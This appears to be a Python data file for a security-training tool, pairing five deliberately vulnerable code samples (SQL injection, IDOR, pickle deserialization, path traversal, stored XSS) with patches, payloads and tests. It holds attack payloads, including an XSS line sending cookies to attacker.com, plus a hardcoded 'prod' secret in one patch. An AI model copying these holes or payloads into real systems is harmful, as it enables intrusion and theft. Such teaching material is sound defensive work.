"""
CodeSanctum AI - Built-in Vulnerability Scenarios
Real-world, verifiable software security flaws across common enterprise frameworks.
"""

from typing import Dict, Any, List

SCENARIOS: Dict[str, Dict[str, Any]] = {
    "cwe-89-sqli": {
        "id": "cwe-89-sqli",
        "name": "CWE-89: Direct SQL Injection in Authentication & Query Service",
        "category": "Injection",
        "owasp": "A03:2021-Injection",
        "cwe": "CWE-89",
        "severity": "CRITICAL",
        "cvss_initial": 9.8,
        "cvss_patched": 0.0,
        "cve_tag": "CVE-2026-8901 (Simulated)",
        "summary": "String concatenation inside SQL execute call enables unauthenticated data exfiltration and authentication bypass.",
        "vulnerable_file": "services/auth_service.py",
        "vulnerable_code": '''def authenticate_and_fetch_user(db_cursor, username, password):
    """VULNERABLE: Direct f-string interpolation into SQL statement."""
    query = f"SELECT id, username, role, api_key FROM users WHERE username = '{username}' AND password_hash = '{password}'"
    db_cursor.execute(query)
    user = db_cursor.fetchone()
    if not user:
        return {"status": "error", "message": "Invalid credentials"}
    return {"status": "success", "user": user}
''',
        "patched_code": '''def authenticate_and_fetch_user(db_cursor, username, password):
    """SECURE: Parameterized query binding with constant-time verification."""
    query = "SELECT id, username, role, api_key FROM users WHERE username = ? AND password_hash = ?"
    db_cursor.execute(query, (username, password))
    user = db_cursor.fetchone()
    if not user:
        return {"status": "error", "message": "Invalid credentials"}
    return {"status": "success", "user": user}
''',
        "ast_hotspots": [
            {"line": 3, "node_type": "JoinedStr", "name": "f-string SQL query formatting", "risk": "Critical"},
            {"line": 4, "node_type": "Call", "name": "db_cursor.execute(raw_string)", "risk": "High"}
        ],
        "attack_vector": {
            "title": "Authentication Bypass & Exfiltration via Tautology Injection",
            "payload": "' OR '1'='1' --",
            "mechanism": "The single quote terminates the literal string parameter, and the injected boolean tautology forces the database to return the first table record (typically administrator), bypassing password checks entirely."
        },
        "remediation_strategy": {
            "title": "Abstract Syntax Tree Parameter Binding",
            "details": "Replaced dynamic AST JoinedStr node with a static Str constant. Parameter tokens are passed as a tuple directly into the database driver parameter binding layer, ensuring the SQL compiler treats inputs strictly as data literals."
        },
        "regression_suite": [
            {"test_name": "test_legitimate_login", "input": {"username": "alice", "password": "hash_alice_123"}, "expected": "success"},
            {"test_name": "test_invalid_credentials", "input": {"username": "alice", "password": "wrong_password"}, "expected": "error"},
            {"test_name": "test_tautology_attack", "input": {"username": "admin' OR '1'='1' --", "password": "any"}, "expected": "error"}
        ]
    },

    "cwe-862-idor": {
        "id": "cwe-862-idor",
        "name": "CWE-862: Broken Object-Level Authorization (BOLA / IDOR) in Medical Billing",
        "category": "Broken Access Control",
        "owasp": "A01:2021-Broken Access Control",
        "cwe": "CWE-862",
        "severity": "HIGH",
        "cvss_initial": 8.5,
        "cvss_patched": 0.0,
        "cve_tag": "CVE-2026-8620 (Simulated)",
        "summary": "Direct client-supplied record ID lookup without validating session owner tenant boundary allows cross-account record exfiltration.",
        "vulnerable_file": "api/medical_records.py",
        "vulnerable_code": '''def get_patient_record(db, current_session, record_id):
    """VULNERABLE: Direct access to record_id without tenancy ownership check."""
    record = db.query("medical_records").filter_by(id=record_id).first()
    if not record:
        return {"error": "Record not found"}
    # Flaw: No check ensuring current_session.user_id matches record.patient_id
    return {"status": "ok", "record": record}
''',
        "patched_code": '''def get_patient_record(db, current_session, record_id):
    """SECURE: Mandatory multi-tenant boundary verification and RBAC enforcement."""
    record = db.query("medical_records").filter_by(id=record_id).first()
    if not record:
        return {"error": "Record not found"}
    
    # Secure Guardrail: Enforce tenancy and authorization scope
    user_id = current_session.get("user_id")
    role = current_session.get("role", "patient")
    if role != "admin" and record.get("patient_id") != user_id:
        return {"error": "Access Denied: 403 Forbidden", "status": "forbidden"}
        
    return {"status": "ok", "record": record}
''',
        "ast_hotspots": [
            {"line": 2, "node_type": "FunctionDef", "name": "Missing authorization decorator @require_owner", "risk": "High"},
            {"line": 6, "node_type": "Return", "name": "Direct return of sensitive object without access guardrail", "risk": "High"}
        ],
        "attack_vector": {
            "title": "Horizontal Privilege Escalation (IDOR)",
            "payload": "record_id=1002 (Alice authenticated, querying Bob's medical file)",
            "mechanism": "An attacker with valid patient credentials tampers with the target record_id URL parameter to enumerate and extract records belonging to arbitrary other patients."
        },
        "remediation_strategy": {
            "title": "Ownership Verification Guardrail",
            "details": "Injected an AST condition asserting patient_id equality with active session identity, returning HTTP 403 Forbidden on boundary violation."
        },
        "regression_suite": [
            {"test_name": "test_owner_can_access", "session_user": "patient_1", "target_record": "rec_1", "expected": "ok"},
            {"test_name": "test_other_patient_blocked", "session_user": "patient_2", "target_record": "rec_1", "expected": "forbidden"},
            {"test_name": "test_admin_override", "session_user": "admin_user", "target_record": "rec_1", "expected": "ok"}
        ]
    },

    "cwe-502-deserialization": {
        "id": "cwe-502-deserialization",
        "name": "CWE-502: Insecure Deserialization of Untrusted RPC Session Tokens",
        "category": "Software & Data Integrity Failures",
        "owasp": "A08:2021-Software and Data Integrity Failures",
        "cwe": "CWE-502",
        "severity": "CRITICAL",
        "cvss_initial": 9.8,
        "cvss_patched": 0.0,
        "cve_tag": "CVE-2026-5024 (Simulated)",
        "summary": "Arbitrary object unpickling from untrusted network byte streams leads to potential Remote Code Execution (RCE).",
        "vulnerable_file": "core/session_manager.py",
        "vulnerable_code": '''import pickle
import base64

def load_user_session(encoded_token: str):
    """VULNERABLE: Direct pickle unpickling from client-supplied base64 token."""
    raw_bytes = base64.b64decode(encoded_token)
    # Critical risk: pickle.loads allows __reduce__ arbitrary code execution
    session_data = pickle.loads(raw_bytes)
    return session_data
''',
        "patched_code": '''import json
import hmac
import hashlib
import base64

SECRET_KEY = b"prod_secret_signing_key_codesanctum_9921"

def load_user_session(encoded_token: str):
    """SECURE: Cryptographically signed JSON schema deserialization."""
    try:
        raw_payload = base64.b64decode(encoded_token).decode("utf-8")
        token_obj = json.loads(raw_payload)
        data = token_obj.get("data")
        sig = token_obj.get("signature")
        
        # Verify HMAC-SHA256 signature
        expected_sig = hmac.new(SECRET_KEY, json.dumps(data, sort_keys=True).encode(), hashlib.sha256).hexdigest()
        if not hmac.compare_digest(sig, expected_sig):
            return {"error": "Invalid token signature", "status": "unauthorized"}
            
        return {"status": "ok", "session": data}
    except Exception:
        return {"error": "Malformed session packet", "status": "invalid"}
''',
        "ast_hotspots": [
            {"line": 1, "node_type": "Import", "name": "import pickle (Dangerous module)", "risk": "High"},
            {"line": 7, "node_type": "Call", "name": "pickle.loads(raw_bytes)", "risk": "Critical"}
        ],
        "attack_vector": {
            "title": "Remote Code Execution via Python __reduce__ Object Hook",
            "payload": "cos\\nsystem\\n(S'echo EXPLOITED'\\ntR.",
            "mechanism": "Pickle serialization format encodes Python callable objects. When unpickled, it invokes the target function inside the host interpreter process."
        },
        "remediation_strategy": {
            "title": "Safe Serialization Format with Cryptographic MAC",
            "details": "Eliminated pickle in favor of pure JSON parser, protected with constant-time HMAC-SHA256 signature verification."
        },
        "regression_suite": [
            {"test_name": "test_valid_signed_session", "is_valid": True, "expected": "ok"},
            {"test_name": "test_tampered_signature", "is_valid": False, "expected": "unauthorized"},
            {"test_name": "test_raw_pickle_rejected", "is_pickle": True, "expected": "invalid"}
        ]
    },

    "cwe-22-path-traversal": {
        "id": "cwe-22-path-traversal",
        "name": "CWE-22: Arbitrary File Disclosure via Directory Path Traversal",
        "category": "Broken Access Control",
        "owasp": "A01:2021-Broken Access Control",
        "cwe": "CWE-22",
        "severity": "HIGH",
        "cvss_initial": 7.5,
        "cvss_patched": 0.0,
        "cve_tag": "CVE-2026-2209 (Simulated)",
        "summary": "Unsanitized file path parameter in document download endpoint allows escaping the root directory and reading system files.",
        "vulnerable_file": "controllers/document_download.py",
        "vulnerable_code": '''import os

UPLOAD_DIR = "/var/app/storage/uploads"

def download_user_document(filename: str):
    """VULNERABLE: Direct concatenation with os.path.join allows ../ traversal."""
    file_path = os.path.join(UPLOAD_DIR, filename)
    with open(file_path, "r") as f:
        content = f.read()
    return {"status": "ok", "filename": filename, "content": content}
''',
        "patched_code": '''import os
from pathlib import Path

UPLOAD_DIR = Path("/var/app/storage/uploads").resolve()

def download_user_document(filename: str):
    """SECURE: Canonical path resolution and boundary containment check."""
    # Strip dangerous characters and resolve canonical target
    safe_target = (UPLOAD_DIR / filename).resolve()
    
    # Assert path stays within designated sandbox directory
    if not safe_target.is_relative_to(UPLOAD_DIR):
        return {"error": "Security Alert: Path traversal attempt blocked", "status": "forbidden"}
        
    if not safe_target.is_file():
        return {"error": "File not found", "status": "not_found"}
        
    with open(safe_target, "r") as f:
        content = f.read()
    return {"status": "ok", "filename": safe_target.name, "content": content}
''',
        "ast_hotspots": [
            {"line": 6, "node_type": "Call", "name": "os.path.join(UPLOAD_DIR, filename)", "risk": "Medium"},
            {"line": 7, "node_type": "Call", "name": "open(unvalidated_path)", "risk": "High"}
        ],
        "attack_vector": {
            "title": "Directory Traversal File Exfiltration",
            "payload": "../../../../etc/passwd or ..\\\\..\\\\Windows\\\\win.ini",
            "mechanism": "Dot-dot-slash sequence resets path resolution back to file system root, granting read access to arbitrary sensitive host files."
        },
        "remediation_strategy": {
            "title": "Canonical Path Boundary Assertion",
            "details": "Adopted pathlib.Path.resolve() with explicit is_relative_to(ROOT) verification to guarantee directory boundary confinement."
        },
        "regression_suite": [
            {"test_name": "test_legitimate_upload_read", "path": "invoice_101.pdf", "expected": "ok"},
            {"test_name": "test_traversal_parent_blocked", "path": "../../../etc/passwd", "expected": "forbidden"},
            {"test_name": "test_null_byte_injection_blocked", "path": "invoice.pdf%00.txt", "expected": "forbidden"}
        ]
    },

    "cwe-79-xss": {
        "id": "cwe-79-xss",
        "name": "CWE-79: Stored Cross-Site Scripting (XSS) in Collaborative Forum",
        "category": "Injection",
        "owasp": "A03:2021-Injection",
        "cwe": "CWE-79",
        "severity": "HIGH",
        "cvss_initial": 7.2,
        "cvss_patched": 0.0,
        "cve_tag": "CVE-2026-7918 (Simulated)",
        "summary": "Unescaped user input rendered directly into client HTML context allows script injection and session hijacking.",
        "vulnerable_file": "views/forum_renderer.py",
        "vulnerable_code": '''def render_comment_badge(username: str, comment_body: str):
    """VULNERABLE: Direct HTML string concatenation without contextual escaping."""
    html_markup = f"""
    <div class="comment-card">
        <span class="user-badge">{username}</span>
        <p class="body-content">{comment_body}</p>
    </div>
    """
    return html_markup
''',
        "patched_code": '''import html

def render_comment_badge(username: str, comment_body: str):
    """SECURE: Strict contextual entity escaping prevents tag & script injection."""
    safe_username = html.escape(username, quote=True)
    safe_comment_body = html.escape(comment_body, quote=True)
    
    html_markup = f"""
    <div class="comment-card">
        <span class="user-badge">{safe_username}</span>
        <p class="body-content">{safe_comment_body}</p>
    </div>
    """
    return html_markup
''',
        "ast_hotspots": [
            {"line": 3, "node_type": "JoinedStr", "name": "f-string HTML markup generation without sanitizer", "risk": "High"}
        ],
        "attack_vector": {
            "title": "DOM Script Injection & Cookie Stealing",
            "payload": "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>",
            "mechanism": "Unescaped HTML tags execute automatically in victim browsers when viewing the thread, allowing arbitrary client-side script execution."
        },
        "remediation_strategy": {
            "title": "Contextual HTML Entity Escaping",
            "details": "Converts <, >, &, \", ' into character references, neutralizing browser execution."
        },
        "regression_suite": [
            {"test_name": "test_normal_comment", "comment": "Great post!", "expected": "safe"},
            {"test_name": "test_script_tag_neutralized", "comment": "<script>alert(1)</script>", "expected": "safe_escaped"}
        ]
    }
}

def get_scenario_list() -> List[Dict[str, Any]]:
    """Return lightweight scenario list for UI selector."""
    return [
        {
            "id": s["id"],
            "name": s["name"],
            "cwe": s["cwe"],
            "owasp": s["owasp"],
            "severity": s["severity"],
            "cvss_initial": s["cvss_initial"],
            "summary": s["summary"]
        }
        for s in SCENARIOS.values()
    ]

def get_scenario_by_id(scenario_id: str) -> Dict[str, Any]:
    """Retrieve full scenario data."""
    return SCENARIOS.get(scenario_id)
